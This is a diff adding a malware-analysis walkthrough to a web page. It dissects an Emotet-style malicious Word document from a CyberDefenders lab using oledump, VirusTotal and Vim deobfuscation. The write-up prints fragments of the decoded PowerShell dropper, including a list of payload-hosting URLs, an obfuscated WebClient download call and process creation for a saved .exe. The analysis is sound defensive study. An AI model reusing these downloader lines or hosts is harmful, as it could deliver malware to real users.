@@ -65,7 +65,129 @@
                             <a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py">Oledump</a> is a program to analyze OLE files. Microsoft Office documents are OLE files and can contain stream of data. Oledump analyze those streams to see if any macro is found in the file. <br>
                             <br>
                             URL : <a href="https://cyberdefenders.org/labs/51">https://cyberdefenders.org/labs/51</a><br>
-                            Download the file from that URL. The file has a malicious macro, do not run it directly in your personal computer. Make sure to have a safe environment, or setup a malware analysis lab.
+                            Download the file from that URL. The file has a malicious macro, do not run it directly in your personal computer. Make sure to have a safe environment, or setup a malware analysis lab. <br>
+                            <br>
+                            Before getting inside of that file, it would be better to know the type of file it is. Is it recognized by antiviruses ? What kind of malware is it ? There are different ways to answer that question, such as sending this file to a public sandbox or send it VirusTotal. For this case, I took the md5 hash of the file and send it to VirusTotal.
+                            <div class="squarebox">md5sum %FILEPATH%</div>
+                            <img src="img/Maldoc/md5sum.png" class="img-fluid" width="600">
+                            The hash of the file is : ea50158bcef30d51e298846c056649c3, let's copy paste it on VirusTotal.
+
+                            <img src="img/Maldoc/virustotal.png" class="img-fluid" width="600">
+
+                            According to VirusTotal, the type of file is a word document that contains some malicious macros, it is the typical way to attack by the Emotet malware. We can also expect some obfuscations in that document. <br>
+                            <br>
+                           
+                            The tool OLEdump will help us to learn more about a file and the command "man" or the parameter -h are really useful to get some information about the tool.
+                            <div class="squarebox">oledump.py -h</div>
+                            <img src="img/Maldoc/oledump_help.png" class="img-fluid" width="600">
+
+                            With the parameter -d, it performs a dump of the file that displays all the streams contained in that document. You can identify the streams that contain a macro when a upper or lower case "M" is found next to the index.
+
+                            <img src="img/Maldoc/oledump_dump.png" class="img-fluid" width="600">
+
+                            In this case, index 13, 15 and 16 contain a macro inside of the data stream. The last index might also indicate that the document is a Word document.
+                            <br>
+                            Let's dig into different data streams to see what they contain. The two parameters needed here is <strong>-s</strong> and <strong>-v</strong>. According to the help section of OLEdump.py, the parameter -s is used to select a item to dump. We won't use -d this time, because we need to decompress the vba otherwise we won't be able to read the data stream. This is why, the parameter -v is used here to decrompress.
+
+                            <div class="squarebox">oledump -s 13 -v %FILEPATH%</div>
+                            <img src="img/Maldoc/stream13.png" class="img-fluid" width="600">
+
+                            Checking the stream 13, we notice that there is a private sub which is a procedure in vba. A procedure is similar to a function, the code inside of the procedure will be executed once the program is calling the procedure. The name of the procedure is Document_open() and will call “boaxvoebxiotqueb” when the document is open. At this point, we still do not know what is “boaxvoebxiotqueb”.
+ 
+                            <div class="squarebox">oledump -s 15 -v %FILEPATH%</div>
+                            <img src="img/Maldoc/stream15.png" class="img-fluid" width="600">
+
+                            Looking at the stream 15, the definition of the function "boaxvoebxiotqueb" is present, and display the code that will be executed when the program is calling the function. Looking at the code below, we see that variable "gooykadheoj" is taking a ASCII value of roubhaol.Zoom + Int(5*3). <br>
+                            Checking the list of data stream, the index 16 is called roubhaol. Let's see if we can find the value of that variable over there.
+                            <img src="img/Maldoc/stream16.png" class="img-fluid" width="600">
+                            However, we didn't find the Zoom variable of the roubhaol object. I decided to run the file in a safe environment to see what information we can retrieve. And the Zoom variable has been found in the roubhaol object when having a glance at the object properties. <strong>Zoom = 100</strong>.
+
+                            <img src="img/Maldoc/zoomvariable.png" class="img-fluid" width="600">
+
+                            gooykadheoj = Chr(100 + Int(5 * 3)) = Chr(115) = 's'
+                            Then we are facing the variable haothkoebtheil that has a lot of obfuscation. This variable is also used in function "juuvzouchmiopxeox".
+                            <div class="squarebox">deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)</div>
+                            Looking at the function, it seems to remove the obfuscation.
+
+                            <img src="img/Maldoc/juuvzouchmiopxeox.png" class="img-fluid" width="600">
+
+                            The variable geutyoeytiestheug is storing the argument, then there is a split function taking as argument this variable and the pattern to remove. 
+                        
+                            <img src="img/Maldoc/haothkoebtheil_pattern.png" class="img-fluid" width="600">
+
+                            To remove a pattern in vim:
+                            <div class="squarebox">%s/[PatternToRemove]/[Replace]/g</div>
+
+                            <img src="img/Maldoc/haothkoebtheil.png" class="img-fluid" width="600">
+                            Even if we do not know what the joefwoefcheaw variable of the roubhaol object is, we can guess this is a "p" for "process". To get the confirmation let's find that variable in the roubhaol object.
+                            <img src="img/Maldoc/jeofwoefcheaw.png" class="img-fluid" width="200">
+                            roubhaol.jeofwoefcheaw = "P"
+                            Therefore, <strong>haothkoebtheil = winmgmts:win32_Process</strong> after deofuscate it.<br>
+                            winmgmts tells WSH(Windows Scripting Host) to use Scripting API objects. It is used to connect to WMI. <br>
+                            The Win32_Process WMI class represents a process on an operating system. Using this class, you can create a process. <br>
+                            <br>
+                            deaknaugthein = roubhaol.kaizseah.ControlTipText <br>
+                            <img src="img/Maldoc/kaizseah.png" class="img-fluid" width="200">
+                            deaknaugthein = "tu"
+                            <br>
+                            giakfeiw = deulsaocthuul + gooykadheoj + roubhaol.paerwagyouqumeid.ControlTipText + deaknaugthein
+                            <img src="img/Maldoc/paerwagyouqumeid.png" class="img-fluid" width="200">
+                            roubhaol.paerwagyouqumeid.ControlTipText = "tar" <br>
+                            giakfeiw = winmgmts:win32_process + s + tar + tu = winmgnmts:win32_processstartu
+                            <br>
+                            queegthaen = giakfeiw + roubhaol.joefwoefcheaw = winmgnmts:win32_processstartuP
+                            <br>
+                            Set deavjoajsear = luumlaud(queegthaen)
+                            The function lummlaud calls CreateObject and put winmgnmts:win32_processstartup as argument. <br>
+                            The Win32_ProcessStartup abstract WMI class represents the startup configuration of a Windows-based process. <br>
+
+                            xve = Array _<br>
+                            ("1234444123", tiajriokchaoy. _<br>
+                            Create(geulgelquuuj, kaenhaig, deavjoajsear), "9938723")
+                            <br>
+                            In vba, a space follow by a "_" tells that the current statement isn't finished and continues on the next line. <br>
+                            xve = Array("1234444123", tiajriokchaoy.Create(geulgelquuuj, kaenhaig, deavjoajsear), "9938723")<br>
+                            The variable xve is a three element list indexed 0 to 2. The first and the last element doesn't seem to be interesting, let's focus on the second one. <br>
+                            tiajriokchaoy.Create(geulgelquuuj, kaenhaig, deavjoajsear), we have no information about tiajriokchaoy and kaenhaig. <br>
+                            <img src="img/Maldoc/geulgelquuuj.png" class="img-fluid" width="500">
+                            The variable sjiqw is passing as argument to the function juuvzouchmiopxeox, therefore we can expect to have some deobfuscation to do with the pattern "2342772g3&*gs7712ffvs626fq".
+
+                            <img src="img/Maldoc/page2.png" class="img-fluid" width="200">
+
+                            I copy the value in Vim, and we have a very long string composed around of 15000 characters.
+
+                            <img src="img/Maldoc/sjiqw.png" class="img-fluid" width="600">
+
+                            Similar as the last time to deobfuscate the string, Vim can help us by running this command:
+                            <div class="squarebox">:%s/2342772g3&\*gs7712ffvs626fq//g</div>
+                            Deobfuscating the pattern, it is running the a powershell command with the parameter -e which means that the powershell script is encoded. In this one, it is encoded in base64. Time to decode it ! <br>
+
+                            <img src="img/Maldoc/b64_decoded.png" class="img-fluid" width="600">
+
+                            To get a better visibility, we can save that script in a file, and with Vim, we will replace ";" by ";" + line break.
+
+                            <div class="squarebox">:%s/;/;\r/g</div>
+
+                            <img src="img/Maldoc/b64_decoded2.png" class="img-fluid" width="600">
+
+                            Inside of that PowerShell script, it becomes very interesting. <br>
+                            We see that it is calling the class [Net.ServicePointManager],
+                            $toehfethxohbaey=$env:userprofile+'\'+$deichbeudreir+'.exe',
+                            $jacleewyiqu='https://haoqunkong.com/bn/s9w4tgcjl_f6669ugu_w4bj/*https://www.techtravel.events/informationl/8lsjhrl6nnkwgyzsudzam_h3wng_a6v5/*http://digiwebmarketing.com/wp-admin/72t0jjhmv7takwvisfnz_eejvf_h6v2ix/*http://holfve.se/images/1ckw5mj49w_2k11px_d/*http://www.cfm.nl/_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/'."s`PliT"([char]42);
+
+                            [char]42 = '*'
+
+                            To retrieve the list of url, we can replace "*" by a line break:
+                            <div class="squarebox">:%s/*/\r/g</div>
+                            <img src="img/Maldoc/httplist.png" class="img-fluid" width="600">
+                            foreach($geersieb in $jacleewyiqu){try{$reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehfethxohbaey); <br>
+                            $reusthoas=.('n'+'ew-ob'+'ject') nEt.weBclIenT; <br>
+                            Net.WebClient is used to send or received data from a resource specified by a URI. This loop will download some data from every url listed in the $jacleewyiqu list and save it in the variable $toehfethxohbaey. $toehfethxohbaey contains the user environment and append $deichbeudreir+'.exe'. Also $deichbeudreir = 337.
+
+                            Then in the case if the size of the file named "337.exe" is greater than 24751 Kb, it will create the process.
+
+
+
 
                         </p>
                     </div>
